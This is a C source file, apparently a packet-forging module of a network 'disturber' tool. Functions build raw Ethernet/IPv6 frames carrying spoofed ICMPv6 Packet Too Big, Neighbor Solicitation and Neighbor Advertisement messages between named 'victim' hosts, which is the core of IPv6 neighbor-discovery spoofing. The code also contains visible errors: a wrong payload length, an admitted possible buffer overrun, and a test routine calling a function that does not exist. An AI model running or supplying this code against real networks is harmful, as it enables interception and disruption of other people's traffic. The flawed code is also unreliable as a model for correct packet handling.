#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <netinet/ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>

#include <disturber.h>
#include <device.h>
#include <victims.h>

typedef struct pseudo_header {
	struct in6_addr ph_src;
	struct in6_addr ph_dst;
	u_int32_t ph_len;
	u_int8_t ph_zero[3];
	u_int8_t ph_nxt;
} pseudo_header;

static unsigned short in_cksum(const unsigned char *addr, int len) {
	int nleft = len;
	unsigned int sum = 0;
	unsigned short *w = (unsigned short *)addr;
	unsigned short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *)(&answer) = *(const unsigned char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}

static unsigned short icmp6_cksum(struct ip6_hdr *ip6) {
	unsigned short sum = 0;
	unsigned char *buf;
	struct icmp6_hdr *icmp6, *tmp;
	struct pseudo_header *ph;

	//TODO: Check for memory overrun
	buf = malloc(sizeof(struct pseudo_header) + ntohs(ip6->ip6_plen));
	memset(buf, 0, sizeof(struct pseudo_header) + ntohs(ip6->ip6_plen));
	ph = (struct pseudo_header *)buf;
	icmp6 = (struct icmp6_hdr *)((char *)buf + sizeof(struct ip6_hdr));

	memcpy(&(ph->ph_src), &(ip6->ip6_src), sizeof(struct in6_addr));
	memcpy(&(ph->ph_dst), &(ip6->ip6_dst), sizeof(struct in6_addr));
	ph->ph_nxt = IPPROTO_ICMPV6;
	ph->ph_len = ip6->ip6_plen;

	tmp = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	memcpy(icmp6, tmp, ntohs(ph->ph_len));

	sum = in_cksum(buf, sizeof(struct pseudo_header) + ntohs(ph->ph_len));

	return sum;
}

// WARN: needs to be freed
char *alloc_pkt2big(struct victim *svic, struct victim *dvic) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	char *packet;
	uint16_t len = (sizeof(struct ethhdr) +
					sizeof(struct ip6_hdr) +
					sizeof(struct icmp6_hdr));

	packet = malloc(len);
	memset(packet, 0, len);

	/* Ethernet Header*/
	eth = (struct ethhdr *)packet;
	memcpy(&(eth->h_source), &(device.hwaddr), ETH_ALEN);
	memcpy(&(eth->h_dest), &(dvic->hwaddr), ETH_ALEN);
	eth->h_proto = htons(ETH_P_IPV6);

	/* IPv6 Header */
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
	ip6->ip6_dst = dvic->ipv6;
	ip6->ip6_src = svic->ipv6;
	ip6->ip6_plen = htons(len);
	ip6->ip6_nxt = IPPROTO_ICMPV6;

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ICMP6_PACKET_TOO_BIG;

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

// WARN:  needs to be freed
char *alloc_ndsolicit(struct in6_addr *addr) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	struct nd_neighbor_solicit *nd;
	char *packet;
	uint16_t len = sizeof(struct ethhdr) +
					sizeof(struct ip6_hdr) +
					sizeof(struct nd_neighbor_solicit);

	packet = malloc(len);
	memset(packet, 0, len);

	/* Ethernet Header*/
	eth = (struct ethhdr *)packet;
	memcpy(&(eth->h_source), &(device.hwaddr), ETH_ALEN);
	// TODO: Dest MAC broadcast
	eth->h_proto = htons(ETH_P_IPV6);

	/* IPv6 Header */
	/* TODO: Revisar os endereços */
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
	memcpy(&ip6->ip6_dst, addr, sizeof(struct in6_addr));
	ip6->ip6_src = device.ipv6;
	ip6->ip6_plen = htons(len);
	ip6->ip6_nxt = IPPROTO_ICMPV6;

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ND_NEIGHBOR_SOLICIT;

	/* ND Solicit */
	nd = (struct nd_neighbor_solicit *)((char *)icmp6 + sizeof(struct icmp6_hdr));
	memcpy(&nd->nd_ns_target, addr, sizeof(struct in6_addr));

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

// WARN:  needs to be freed
/* source victim data, dest victim */
char *alloc_ndadvert(struct victim *svic, struct victim *dvic) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	struct nd_neighbor_advert *nd;
	char *packet;
	uint16_t len = sizeof(struct ethhdr) +
					sizeof(struct ip6_hdr) +
					sizeof(struct nd_neighbor_advert);

	packet = malloc(len);
	memset(packet, 0, len);

	/* Ethernet Header*/
	eth = (struct ethhdr *)packet;
	memcpy(&(eth->h_source), &(device.hwaddr), ETH_ALEN);
	memcpy(&(eth->h_dest), &(dvic->hwaddr), ETH_ALEN);
	eth->h_proto = htons(ETH_P_IPV6);

	/* IPv6 Header */
	/* TODO: Revisar os endereços */
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
	ip6->ip6_dst = dvic->ipv6;
	ip6->ip6_src = svic->ipv6;
	ip6->ip6_plen = htons(len);
	ip6->ip6_nxt = IPPROTO_ICMPV6;

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ND_NEIGHBOR_ADVERT;

	/* ND Advertise */
	nd = (struct nd_neighbor_advert *)((char *)icmp6 + sizeof(struct icmp6_hdr));
	nd->nd_na_target = dvic->ipv6;

	icmp6->icmp6_cksum = icmp6_cksum(ip6);

	return packet;
}

#ifdef __PKG_TEST__
main() {
	int i;
	char *pkt = pkt2big();

	for (i = 0; i < sizeof(struct ethhdr); i++) {
		printf("%X", pkt[i]);
		if (!((i + 1) % 10))
			printf("\n");
	}
	printf("\n");
}
#endif

